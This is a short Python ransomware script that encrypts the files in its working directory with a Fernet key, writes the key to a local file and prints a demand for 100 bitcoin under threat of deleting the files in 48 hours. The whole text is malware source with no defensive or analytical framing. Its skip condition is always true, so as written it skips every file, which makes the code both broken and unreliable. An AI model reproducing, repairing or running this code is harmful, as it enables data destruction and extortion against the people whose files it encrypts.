import os
from cryptography.fernet import Fernet
files =[]
for file in os.listdir():
    if file== "ransom.py" or file =="danger.key" or "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
key=Fernet.generate_key()
with open ("danger.key", "wb") as dangerkey:
    dangerkey.write(key)
for file in files:
    with open (file, "rb") as thefile:
        contens = thefile.read()
    contens_encrypted = Fernet(key).encrypt(contens)
    with open(file,"wb") as  thefile:
        thefile.write(contens_encrypted)
print("All files have been encrypted!!! Send me 100 BITCOINN or i will felete them in 48 hours!")
